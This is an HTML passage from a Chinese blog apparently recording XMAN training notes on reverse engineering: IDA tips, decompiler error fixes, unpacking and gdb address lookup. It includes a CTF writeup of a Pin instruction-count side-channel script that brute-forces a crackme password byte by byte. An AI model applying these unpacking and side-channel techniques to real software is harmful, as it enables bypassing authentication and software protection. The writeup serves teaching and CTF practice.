-<h3 id="6-运行时查看文件执行"><a href="#6-运行时查看文件执行" class="headerlink" title="6. 运行时查看文件执行"></a>6. 运行时查看文件执行</h3><p>做了一道题，在你不执行的时候，只能找到相对地址，但是下断点需要实际的执行地址。若关闭PIE，那么每次的执行地址将会一致，这个时候就需要找到执行的开始地址。peda的常用指令中有vmmap，可以找到实际地址。</p>
-<p>这道题很让人苦恼的是，如果gdb中执行run，那么将陷入循环而不能使用vmmap，若强制结束，最后vmmap会报错。这个时候，就有另外的一些办法：</p>
-<ul>
-<li>执行./pwn &amp;，这个时候会将pwn程序放入后台，而且你能快速知道这个程序的PID，这个时候cat /proc/pwn的PID/maps，就能找到对应的执行时地址。之后kill -9 pwn的PID</li>
-<li>编写一个小脚本，任意放置一个断点，并开启gdb调试，这个时候断点会崩溃，但是gdb-peda中使用vmmap仍能找到对应地址</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/03/XMAN之旅-逆向基础（下）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/08/03/XMAN之旅-逆向基础（下）/" itemprop="url">XMAN之旅_逆向基础（下）</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-03T00:07:08+08:00">
-                2017-08-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/xman/" itemprop="url" rel="index">
-                    <span itemprop="name">xman</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="三、-CTF逆向与现实逆向"><a href="#三、-CTF逆向与现实逆向" class="headerlink" title="三、 CTF逆向与现实逆向"></a>三、 CTF逆向与现实逆向</h3><ul>
-<li><p>CTF逆向特点</p>
-<ul>
-<li>代码量小</li>
-<li>结构简单<ul>
-<li>单文件</li>
-</ul>
-</li>
-<li>编码单一</li>
-<li>现代语言特性少<ul>
-<li>面向过程</li>
-</ul>
-</li>
-<li>加密壳/优化少</li>
-<li>语言常见<ul>
-<li>C/C++/ASM</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>现实逆向</p>
-<ul>
-<li>代码量巨大</li>
-<li>结构复杂<ul>
-<li>大量静态库、动态库</li>
-</ul>
-</li>
-<li>各种乱码</li>
-<li>大量现代语言特性<ul>
-<li>OO、Template</li>
-</ul>
-</li>
-<li>优化和加密壳十分常见</li>
-<li>语言可能十分神器<ul>
-<li>Go/VB/Delphi</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="四、IDA高级使用"><a href="#四、IDA高级使用" class="headerlink" title="四、IDA高级使用"></a>四、IDA高级使用</h3><h4 id="1-设置字符串编码和格式"><a href="#1-设置字符串编码和格式" class="headerlink" title="1. 设置字符串编码和格式"></a>1. 设置字符串编码和格式</h4><ul>
-<li>快捷键：<font color="#f00">Alt+A</font></li>
-<li>可以设置字符串类型<ul>
-<li>Unicode字符串 （WCS）</li>
-<li>多字节字符串 （MBS）</li>
-<li>其他</li>
-</ul>
-</li>
-<li>可以设置字符串编码<ul>
-<li>需要系统支持相应的编码</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-导入-导出数据"><a href="#2-导入-导出数据" class="headerlink" title="2. 导入/导出数据"></a>2. 导入/导出数据</h4><ul>
-<li>快捷键：<font color="#f00">Shift+E</font></li>
-<li>菜单名：<ul>
-<li>Edit -&gt; Import Data</li>
-<li>Edit -&gt; Export Data</li>
-</ul>
-</li>
-<li>操作：<ul>
-<li>选定后按快捷键</li>
-</ul>
-</li>
-<li>方便提取数据或修改idb数据库</li>
-</ul>
-<h4 id="3-选定大段数据"><a href="#3-选定大段数据" class="headerlink" title="3. 选定大段数据"></a>3. 选定大段数据</h4><ul>
-<li>快捷键： <font color="#f00">Alt+L</font></li>
-<li><ul>
-<li>菜单名：<ul>
-<li>Edit -&gt; Begin Selection</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>将标定选择起始点</li>
-<li>滚轮或按g跳转至结束位置</li>
-</ul>
-<h4 id="4-批量应用类型"><a href="#4-批量应用类型" class="headerlink" title="4. 批量应用类型"></a>4. 批量应用类型</h4><ul>
-<li>操作<ul>
-<li>设置好第一个类型</li>
-<li>利用选定大量数据的方法选定数据</li>
-<li>按*或按d弹出建立数组对话框</li>
-<li><font color="#f0f">不勾选Create as array</font>
-
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-设置间接跳转地址"><a href="#5-设置间接跳转地址" class="headerlink" title="5. 设置间接跳转地址"></a>5. 设置间接跳转地址</h4><ul>
-<li>快捷键：<font color="#f00">Alt+F11</font></li>
-<li>菜单名：<ul>
-<li>Edit -&gt; Plugins -&gt; Change the callee address </li>
-</ul>
-</li>
-<li>将利用动态调试获取到的调用/跳转地址填入，可以极大地帮助IDA和F5的分析（不如参数个数、调用约定等），获得更准确的结果</li>
-</ul>
-<h4 id="6-修复跳转表"><a href="#6-修复跳转表" class="headerlink" title="6. 修复跳转表"></a>6. 修复跳转表</h4><ul>
-<li>默认无快捷键，可手动设置</li>
-<li>菜单<ul>
-<li>Edit -&gt; Other -&gt; Specify switch idiom</li>
-</ul>
-</li>
-<li>当程序在PIE时可能会导致<font color="#f00">跳转表分析失败</font>，于是需要手动修复来获得更好的分析结果</li>
-</ul>
-<h4 id="7-IDAPython"><a href="#7-IDAPython" class="headerlink" title="7. IDAPython"></a>7. IDAPython</h4><ul>
-<li>IDA自带支持的脚本</li>
-<li>可以使用几乎所有IDA提供的API</li>
-<li>可以快速完成大量重复性操作</li>
-<li>可以方便的了解IDA内部的数据和结构</li>
-</ul>
-<h3 id="五、IDA-F5出错处理"><a href="#五、IDA-F5出错处理" class="headerlink" title="五、IDA F5出错处理"></a>五、IDA F5出错处理</h3><h4 id="1-positive-sp-value"><a href="#1-positive-sp-value" class="headerlink" title="1. positive sp value"></a>1. positive sp value</h4><ul>
-<li>成因：IDA会自动分析SP寄存器的变化量，由于缺少调用约定、参数个数等信息，导致分析出错</li>
-<li>解决方案<ul>
-<li>推荐：在<font color="#f00">Option -&gt; General设置显示Stack pointer</font>，然后去检查对应地址附近调用的函数的调用约定以及栈指针变化</li>
-<li>不推荐： 在对应地址处按<font color="#f00">Alt+K</font>，然后输入一个较大的负值（有风险）</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-call-analysis-failed"><a href="#2-call-analysis-failed" class="headerlink" title="2. call analysis failed"></a>2. call analysis failed</h4><ul>
-<li>成因：F5在分析调用时，未能成功解析<font color="#f00">参数位置/参数个苏</font></li>
-<li>解决方案：<ul>
-<li>对于间接调用（类似call eax等），可使用之前讲过的<font color="#f0f">设置调用地址</font>的方法解决</li>
-<li>对于直接调用，查看<font color="#f0f">调用目标的type</font>是否正确设置。<font color="#f0f">可变参数</font>是引发这种错误的主要原因之一</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-cannot-convert-to-microcode"><a href="#3-cannot-convert-to-microcode" class="headerlink" title="3. cannot convert to microcode"></a>3. cannot convert to microcode</h4><ul>
-<li>成因：部分指令无法被编译</li>
-<li>解决方案：<ul>
-<li>最常见起因是函数中<font color="#f0f">有未设置成指令的数据字节</font>，按c将其设置为指令即可</li>
-<li>其次常见的是<font color="#f0f">x86中的rep前缀</font>，比如<font color="#f0f">repxx  jmp</font>等。可以将该指令的<font color="#f0f">第一个字节(repxx前缀的对应位置)patch为0x90 (NOP)</font></li>
-</ul>
-</li>
-</ul>
-<h4 id="4-stack-frame-is-too-big"><a href="#4-stack-frame-is-too-big" class="headerlink" title="4. stack frame is too big"></a>4. stack frame is too big</h4><ul>
-<li>成因：在分析栈帧时，IDA出现异常，导致分析出错</li>
-<li>解决方案：<ul>
-<li>找到明显不合常理的stack variable offset，双击进入栈帧界面，<font color="#f0f">按u键删除对应的stack variable</font></li>
-<li>如果是去壳导致的原因，先用OD等软件脱壳</li>
-<li>可能由花指令导致，请手动或自动检查并去除花指令</li>
-</ul>
-</li>
-<li>非常罕见</li>
-</ul>
-<h4 id="5-local-variable-allocation-failed"><a href="#5-local-variable-allocation-failed" class="headerlink" title="5. local variable allocation failed"></a>5. local variable allocation failed</h4><ul>
-<li>成因： 分析函数时，有部分变量对应的区域<font color="#f0f">发生重叠</font>，多见于ARM平台出现Point、Rect等8字节、16字节、32字节结构</li>
-<li>解决方案<ul>
-<li>修改对应参数为多个int</li>
-<li>修改ida安装目录下hexrays.cfg中的HO_IGNORE_OVERLAPS</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-F5结果不正确"><a href="#6-F5结果不正确" class="headerlink" title="6. F5结果不正确"></a>6. F5结果不正确</h4><ul>
-<li>成因：F5会自动删除其认为不可能到达的死代码</li>
-<li>常见起因是一个函数错误的标注为noretur函数</li>
-<li>解决方案<ul>
-<li>进到目前反编译结果，找到<font color="#f0f">最后被调用的函数(被错误分析的函数)，双击进入（迫使HexRays重新分析相应函数）</font></li>
-<li>如果上述方案不成功，那么进到被错误分析的函数，按Tab切换到反汇编界面，按Alt+P进入界面取消函数的Does not return 属性</li>
-</ul>
-</li>
-</ul>
-<h3 id="六、IDA-F5高级使用"><a href="#六、IDA-F5高级使用" class="headerlink" title="六、IDA F5高级使用"></a>六、IDA F5高级使用</h3><h4 id="1-自定义寄存器传参"><a href="#1-自定义寄存器传参" class="headerlink" title="1. 自定义寄存器传参"></a>1. 自定义寄存器传参</h4><ul>
-<li>使用IDA中的<strong>usercall和</strong>userpurge调用约定（两个下划线）</li>
-<li>设置范例<ul>
-<li>int __usercall test&lt;eax&gt; (int al &lt;ebx&gt;);</li>
-<li>&lt;&gt;中为对应值的位置</li>
-<li>第一个&lt;&gt;为返回值位置，注意返回值的位置即使不变也要填写</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-HexRays源码级调试"><a href="#2-HexRays源码级调试" class="headerlink" title="2. HexRays源码级调试"></a>2. HexRays源码级调试</h4><ul>
-<li>注意<ul>
-<li>F5中显示的变量很可能不是变量原来的值，尤其是寄存器变量，尽量在  值位置断下并查看</li>
-<li>对于优化后的代码，F5调试bug很多</li>
-<li>F5单步不太稳定，在ARM平台可能会跑飞</li>
-<li>F5的运行至指定位置功能功能不稳定</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-恢复符号"><a href="#3-恢复符号" class="headerlink" title="3. 恢复符号"></a>3. 恢复符号</h4><ul>
-<li>找到程序的旧版本<ul>
-<li>大量程序早期版本中安全意识薄弱，没有删除符号等各种信息</li>
-<li>苹果用户可以在AppAdmin中获取版本应用</li>
-</ul>
-</li>
-<li>Rizzo匹配</li>
-<li>看程序自带的String<ul>
-<li>许多程序自带大量调试信息，从而可以获取符号</li>
-</ul>
-</li>
-<li>Google搜索源码<ul>
-<li>CS、iOS都有被泄露过</li>
-<li>按获得信息搜索源码<ul>
-<li>大量程序中使用Stack Overflow、CSDN等答案</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>制作Signtature<ul>
-<li>IDA提供自动制作Signature的工具</li>
-<li>打开IDASDK68文件夹找到flair 58文件夹</li>
-</ul>
-</li>
-</ul>
-<h3 id="七、IDA-插件搞定虚表"><a href="#七、IDA-插件搞定虚表" class="headerlink" title="七、IDA 插件搞定虚表"></a>七、IDA 插件搞定虚表</h3><h4 id="1-虚表简介"><a href="#1-虚表简介" class="headerlink" title="1. 虚表简介"></a>1. 虚表简介</h4><p>虚表是业界难题，虚函数的处理会因编译器采取的ABI的不同而不同</p>
-<ul>
-<li>IDA操作的插件<ul>
-<li>HexraysCodeXplorer</li>
-<li>hexrays_tool</li>
-<li>HexRaysPyTools</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-实验样例"><a href="#2-实验样例" class="headerlink" title="2. 实验样例"></a>2. 实验样例</h4><ul>
-<li>快捷键： Shift + F</li>
-<li>菜单： 右键 -&gt; Deeo Scan Variable</li>
-<li>操作<ul>
-<li>在构造函数中执行上述操作、等待扫描完毕</li>
-<li>按Alt+F8打开Signature Builder，看到有黄色部分，然后选不正确的field点</li>
-<li>清楚所有的黄色部分后即可点击Finalize，在新弹出的窗口中修改名称</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/02/XMAN之旅-逆向基础（上）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/08/02/XMAN之旅-逆向基础（上）/" itemprop="url">XMAN之旅_逆向基础（上）</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-02T12:43:02+08:00">
-                2017-08-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/xman/" itemprop="url" rel="index">
-                    <span itemprop="name">xman</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>这堂课是由Nu1L著名队员Misty所讲，内容很多，范围很广，是作为逆向的基础入门知识——实际上内容还是有点难度的。</p>
-<h3 id="一、-初级工具使用"><a href="#一、-初级工具使用" class="headerlink" title="一、 初级工具使用"></a>一、 初级工具使用</h3><p><br></p>
-<h4 id="1-二进制编辑器"><a href="#1-二进制编辑器" class="headerlink" title="1. 二进制编辑器"></a>1. 二进制编辑器</h4><p>Misty作为一位资深的逆向大佬，向我们推荐了两款好用的二进制编辑器：010Editor 和 Editplus</p>
-<p>010 Editor是文本/十六进制编辑器，还包括文件解析、计算器、文本比较等功能。其可以通过官方网站提供的脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。</p>
-<p>010Editor的文本解析功能，方便了我们分析文件，理清文件内容。</p>
-<p>Editplus则是Misty的二次元之心作祟，要支持各种编码，这个确实是不错的选择。</p>
-<h4 id="2-可执行文件查看"><a href="#2-可执行文件查看" class="headerlink" title="2. 可执行文件查看"></a>2. 可执行文件查看</h4><p>对于这部分，我的感触就是看书，看《加密与解密(第三版)》-看雪安全论坛</p>
-<p>PE: CFF Explorer<br>MachO: MachOView<br>ELF: IDA</p>
-<h4 id="3-格式转换工具"><a href="#3-格式转换工具" class="headerlink" title="3. 格式转换工具"></a>3. 格式转换工具</h4><p>推荐使用shellcode helper</p>
-<h4 id="4-反汇编器"><a href="#4-反汇编器" class="headerlink" title="4. 反汇编器"></a>4. 反汇编器</h4><p>推荐使用IDA<br>IDA的功能十分强大，而且其超前的意识也让它被大家广泛使用！</p>
-<ul>
-<li>界面转换<ul>
-<li>d: 设置Data（多次使用可以在1字节、2字节、4字节、8字节间转换）</li>
-<li>c: 设置Code</li>
-<li>x: Cross Reference</li>
-<li>Shift+F12：查看所有字符串</li>
-</ul>
-</li>
-<li>反编译器使用<ul>
-<li>y：设置类型（变量、函数）、设置Calling Conversion</li>
-</ul>
-</li>
-<li>其他快捷键<ul>
-<li>N：对（变量、函数）重命名</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-调试器"><a href="#5-调试器" class="headerlink" title="5. 调试器"></a>5. 调试器</h4><ul>
-<li><p>命令行调试器有：</p>
-<ul>
-<li>gdb: 用于linux等多种系统中</li>
-<li>windbg：用于windows调试</li>
-</ul>
-</li>
-<li><p>图形界面调试器：</p>
-<ul>
-<li>OllyDbg：调试win32程序</li>
-<li>x64_dbg：调试win32/64程序</li>
-<li>IDA内置调试器</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-搭建调试环境"><a href="#6-搭建调试环境" class="headerlink" title="6. 搭建调试环境"></a>6. 搭建调试环境</h4><p>在IDA PRO中有dbgsrv文件夹。里面放置了一些远程可执行程序。只需要在远程启用这些程序，就可以在本地远程调试。</p>
-<h4 id="6-去除软件保护"><a href="#6-去除软件保护" class="headerlink" title="6. 去除软件保护"></a>6. 去除软件保护</h4><ul>
-<li>侦壳<ul>
-<li>PEiD、ExeInfo</li>
-</ul>
-</li>
-<li>脱壳<ul>
-<li>搜索脱壳机（比较多的有upx、ASPack。对于upx，推荐使用upx shell）</li>
-<li>ESP定律快速脱壳<ul>
-<li>原理：脱壳前后位置不变</li>
-<li>适用环境：只针对压缩壳</li>
-<li>范例：<br>首先进入程序，并设置ESP处的硬件断点，如图所示<br><img src="/images/2017-08-02/first.png" alt="first"><br>然后运行至硬件断点处，发现后面有个长跳转，在其位置上设置断点<br><img src="/images/2017-08-02/second.jpg" alt="second"><br>最后运行至长跳转位置处，然后直接步进，进入程序的正式入口，选用插件OllyDump，设置起始地址和入口点修正地址，然后脱壳即可！<br><img src="/images/2017-08-02/third.jpg" alt="third"></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>去除花指令<ul>
-<li>使用OllyDbg脚本</li>
-<li>手动总结特征码，然后修改</li>
-</ul>
-</li>
-<li>去除混淆<ul>
-<li>.net反混淆器 de4dot</li>
-</ul>
-</li>
-</ul>
-<h4 id="7-定位验证代码"><a href="#7-定位验证代码" class="headerlink" title="7. 定位验证代码"></a>7. 定位验证代码</h4><ul>
-<li><p>任务：</p>
-<ul>
-<li>破除保护外壳</li>
-<li>理解程序逻辑</li>
-<li>找到验证函数</li>
-<li>逆推获取flag</li>
-</ul>
-</li>
-<li><p>方法</p>
-<ul>
-<li>正向（从main开始）</li>
-<li>逆向（从输入输出函数回溯）</li>
-</ul>
-</li>
-</ul>
-<h3 id="二、-逆向方法总结"><a href="#二、-逆向方法总结" class="headerlink" title="二、 逆向方法总结"></a>二、 逆向方法总结</h3><h4 id="1-算法分析与逆向"><a href="#1-算法分析与逆向" class="headerlink" title="1. 算法分析与逆向"></a>1. 算法分析与逆向</h4><ul>
-<li>没算法（签到题）</li>
-<li>常见算法<ul>
-<li>简单异或</li>
-<li>带雪崩效应的异或（CBC）</li>
-<li>加密算法（RSA、AES）<ul>
-<li>RSA中会引用大数库函数</li>
-<li>AES如果出得简单，那么解密函数应该在程序中，否则就得理清程序逻辑</li>
-</ul>
-</li>
-<li>散列算法（MD5、SHA1）<ul>
-<li>MD5中会出现常数，所以应该会有0123456789ABCDEF这一串数</li>
-<li>SHA1中也会出现常数，google一下就能判断</li>
-</ul>
-</li>
-<li>解方程<ul>
-<li>推荐使用z3，使用时注意与python配合，十分简单</li>
-<li>python的数学运算库</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>有趣的算法<ul>
-<li>走迷宫</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-边信道攻击-side-channel-attack-简称SCA"><a href="#2-边信道攻击-side-channel-attack-简称SCA" class="headerlink" title="2. 边信道攻击(side channel attack 简称SCA)"></a>2. 边信道攻击(side channel attack 简称SCA)</h4><p>原理： 检测程序执行的行指令数、<br>应用：逐字节验证的题目</p>
-<p><b>范例：采用codegate-preliminary-2014/dodocrackme/</b></p>
-<pre><code>$ file crackme 
-crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=92ef00b31d91a827a5aed6b0fe03fe38fe20fb4d, stripped
-$ ./crackme 
-root@localhost's password: bla
-Permission denied (password).
-$ objdump -d crackme | wc -l
-15809
-</code></pre>
-
-<p>我们使用pin进行测试得到：</p>
-<pre><code>$ pin -t inscount0 -o out -- ./crackme ; cat out
-root@localhost's password: a
-Permission denied (password).
-Count 715821
-$ pin -t inscount0 -o out -- ./crackme ; cat out
-root@localhost's password: b
-Permission denied (password).
-Count 716328
-$ pin -t inscount0 -o out -- ./crackme ; cat out
-root@localhost's password: c
-Permission denied (password).
-Count 716835
-$ bc -lq
-716328 -715821
-507
-716835 - 716328
-507
-</code></pre>
-
-<p>使用所有可见字符，最后得到的测试结果如下：</p>
-<pre><code>$ python bf.py 
-Input [!] -> [717933] delta [507]
-Input ["] -> [718440] delta [507]
-Input [#] -> [718947] delta [507]
-Input [$] -> [719454] delta [507]
-Input [%] -> [719961] delta [507]
-Input [&] -> [720468] delta [507]
-Input ['] -> [720975] delta [507]
-Input [(] -> [721482] delta [507]
-Input [)] -> [721989] delta [507]
-Input [*] -> [722496] delta [507]
-Input [+] -> [723003] delta [507]
-Input [,] -> [723510] delta [507]
-Input [-] -> [724017] delta [507]
-Input [.] -> [724524] delta [507]
-Input [/] -> [725031] delta [507]
-Input [0] -> [725538] delta [507]
-Input [1] -> [726045] delta [507]
-Input [2] -> [726552] delta [507]
-Input [3] -> [727059] delta [507]
-Input [4] -> [727566] delta [507]
-Input [5] -> [728073] delta [507]
-Input [6] -> [728580] delta [507]
-Input [7] -> [729087] delta [507]
-Input [8] -> [729594] delta [507]
-Input [9] -> [730101] delta [507]
-Input [:] -> [730608] delta [507]
-Input [;] -> [731115] delta [507]
-Input [<] -=""> [731622] delta [507]
-Input [=] -> [732129] delta [507]
-Input [>] -> [732636] delta [507]
-Input [?] -> [733143] delta [507]
-Input [@] -> [733650] delta [507]
-Input [A] -> [734157] delta [507]
-Input [B] -> [734664] delta [507]
-Input [C] -> [735171] delta [507]
-Input [D] -> [735678] delta [507]
-Input [E] -> [736185] delta [507]
-Input [F] -> [736692] delta [507]
-Input [G] -> [737199] delta [507]
-Input [H] -> [701989] delta [-35210]
-Input [I] -> [703653] delta [1664]
-Input [J] -> [704160] delta [507]
-Input [K] -> [704667] delta [507]
-Input [L] -> [705174] delta [507]
-Input [M] -> [705681] delta [507]
-Input [N] -> [706188] delta [507]
-Input [O] -> [706695] delta [507]
-Input [P] -> [707202] delta [507]
-Input [Q] -> [707709] delta [507]
-Input [R] -> [708216] delta [507]
-Input [S] -> [708723] delta [507]
-Input [T] -> [709230] delta [507]
-Input [U] -> [709737] delta [507]
-Input [V] -> [710244] delta [507]
-Input [W] -> [710751] delta [507]
-Input [X] -> [711258] delta [507]
-Input [Y] -> [711765] delta [507]
-Input [Z] -> [712272] delta [507]
-Input [[] -> [712779] delta [507]
-Input [\] -> [713286] delta [507]
-Input []] -> [713793] delta [507]
-Input [^] -> [714300] delta [507]
-Input [_] -> [714807] delta [507]
-Input [`] -> [715314] delta [507]
-Input [a] -> [715821] delta [507]
-Input [b] -> [716328] delta [507]
-Input [c] -> [716835] delta [507]
-Input [d] -> [717342] delta [507]
-Input [e] -> [717849] delta [507]
-Input [f] -> [718356] delta [507]
-Input [g] -> [718863] delta [507]
-Input [h] -> [719370] delta [507]
-Input [i] -> [719877] delta [507]
-Input [j] -> [720384] delta [507]
-Input [k] -> [720891] delta [507]
-Input [l] -> [721398] delta [507]
-Input [m] -> [721905] delta [507]
-Input [n] -> [722412] delta [507]
-Input [o] -> [722919] delta [507]
-Input [p] -> [723426] delta [507]
-Input [q] -> [723933] delta [507]
-Input [r] -> [724440] delta [507]
-Input [s] -> [724947] delta [507]
-Input [t] -> [725454] delta [507]
-Input [u] -> [725961] delta [507]
-Input [v] -> [726468] delta [507]
-Input [w] -> [726975] delta [507]
-Input [x] -> [727482] delta [507]
-Input [y] -> [727989] delta [507]
-Input [z] -> [728496] delta [507]
-Input [{] -> [729003] delta [507]
-Input [|] -> [729510] delta [507]
-Input [}] -> [730017] delta [507]
-Input [~] -> [730524] delta [507]
-</]></code></pre>
-
-<p>于是得到首字母为H</p>
-<p>我们使用下面的脚本进行测试，得到结果：</p>
-<pre><code>#!/usr/bin/python
-import os, pexpect, time
-from subprocess import Popen,PIPE
-
-pinpath="/ctf/TOOLS/pin/pin"
-
-def try_list(lst):
-    procs = {}
-    ret_dict = {}
-    for (idx, s) in enumerate(lst):
-        out_file = s.encode('hex')
-        p = Popen([pinpath, "-t", "inscount0", "-o", "tmp/" + out_file, "--", "./crackme"], stdout = PIPE, stdin = PIPE)
-        procs[s] = p
-        p.stdin.write(s + "\n")
-
-    prev = 0
-    show_delta = False
-    delta = {}
-    for (idx,s) in enumerate(lst):
-        while procs[s].poll() is None:
-            time.sleep(0.5)
-        if "denied" not in procs[s].stdout.read():
-            print "Output different for password [%s]" % s
-            exit(-1)
-        out_file = s.encode('hex')
-        output = open("tmp/" + out_file).read().split(" ")[1].strip()
-        instr_count = int(output)
-        if show_delta:
-            #print "Input [%s] -> [%s] delta [%s]" % (s, instr_count, instr_count - prev)
-            delta[s] = instr_count - prev
-        else:
-            show_delta = True
-        prev = instr_count
-
-    for (idx,s) in enumerate(lst):
-        if idx < 2:
-            continue
-        if delta[s] != delta[lst[idx-1]]:
-            return s
-
-prefix = ""
-while True:
-    lst = [prefix + chr(i) for i in range(32,127)]
-    prefix = try_list(lst)
-    print "Trying input -> %s" % prefix
-
-</code></pre>
-
-<h4 id="3-逆向小技巧"><a href="#3-逆向小技巧" class="headerlink" title="3. 逆向小技巧"></a>3. 逆向小技巧</h4><ul>
-<li>快速找main入口<ul>
-<li>寻找一个<font color="#f00">大跳转</font></li>
-</ul>
-</li>
-<li>快速定位关键位置<ul>
-<li>从Function List靠前位置开始乱翻<ul>
-<li>编译时不同源文件会被分别编译为.o，再由编译器合并</li>
-<li>编译命令行中标准库一般在最前面</li>
-</ul>
-</li>
-<li>从main函数旁边翻</li>
-</ul>
-</li>
-<li>应对MFC程序<ul>
-<li>使用xspy工具查看消息处理函数<ul>
-<li>将xspy上的放大镜拖到感兴趣的函数（如OnClick、OnCommand等</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>手动加载Signature<ul>
-<li>碰到无法自动识别库函数时<ul>
-<li>Shift+F5: View -&gt; Open Subviews -&gt; Signatures (注意要选择好Library，如果使用mfc，就应该选择vc32mfc文件)</li>
-<li>Shift+F11: View -&gt; Open Subviews -&gt; Type Libraries</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>如何得知MessageBox弹框后，程序在哪继续进行<ul>
-<li>在OD或x64dbg中找到内存布局列表<ul>
-<li>OD：<font color="#f00">Alt+M</font> -&gt; 内存</li>
-<li>x64dbg：在窗口栏点击<font color="#f00">内存布局</font></li>
-</ul>
-</li>
-<li>找到自己程序的代码段（通常是本程序的.text，按F2，<font color="#f00">设置区断点</font>）</li>
-<li>返回程序点击确定即可</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/28/文件类型漏洞挖掘与Smart-Fuzz/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
